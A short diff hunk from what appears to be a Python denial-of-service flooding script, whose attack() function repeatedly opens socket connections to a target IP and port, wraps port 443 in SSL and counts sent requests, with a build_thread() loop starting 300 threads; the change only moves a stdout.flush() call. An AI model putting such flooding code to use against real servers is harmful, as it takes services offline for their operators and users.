@@ -124,12 +124,12 @@ def attack():
             s.connect((ip, port))
             num_sent = num_sent + 1
             sys.stdout.write("[+] [Failed Request]: " + str(req_error) + " ["+ str(num_sent) + " SENT] => "+ip+":"+str(port)+path+"\r")
-            sys.stdout.flush()
             if port == 443:
                 x = ssl.wrap_socket(s)
                 port443(x,request)
         except:
             req_error=req_error+1
+        sys.stdout.flush()
 
 def build_thread():
 	for _ in range(300):
